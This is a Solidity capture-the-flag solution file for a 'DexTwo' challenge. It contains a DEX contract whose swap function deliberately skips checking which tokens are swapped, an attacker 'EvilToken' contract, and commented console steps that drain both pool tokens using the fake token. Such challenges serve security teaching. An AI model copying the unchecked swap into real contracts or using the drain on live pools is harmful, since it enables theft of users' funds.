// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract DexTwo {
    using SafeMath for uint256;
    address public token1;
    address public token2;

    constructor(address _token1, address _token2) public {
        token1 = _token1;
        token2 = _token2;
    }

    function swap(
        address from,
        address to,
        uint256 amount
    ) public {
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint256 swap_amount = get_swap_amount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swap_amount);
        IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
    }

    function add_liquidity(address token_address, uint256 amount) public {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function get_swap_amount(
        address from,
        address to,
        uint256 amount
    ) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(spender, amount);
        SwappableTokenTwo(token2).approve(spender, amount);
    }

    function balanceOf(address token, address account)
        public
        view
        returns (uint256)
    {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }
}

contract EvilToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("EvilToken", "EVL") {
        _mint(msg.sender, initialSupply);
    }
}

/*
Steps to Complete the Challenge

1. await contract.approve(contract.address, 300) *** this step results in an infinite loop at Metamask to approve the transaction!!!
2. evlToken = '<EVL-token-address>'
3. t1 = await contract.token1()
4. t2 = await contract.token2()
5. await contract.swap(evlToken, t1, 100)
6. await contract.swap(evlToken, t2, 200)

** The vulnerability here arises from swap method which does not check that the swap is necessarily between token1 and token2. We'll exploit this. **

Reference - https://coder-question.com/cq-blog/525193

      DEX             |      player  
token1 - token2 - EVL | token1 - token2 - EVL
---------------------------------------------
  100     100     100 |   10      10      300   // starting
  0       100     200 |   110     10      200   // after swapping EVL with token1
  0       0       400 |   110     110     0     // after swapping EVL with token2

*/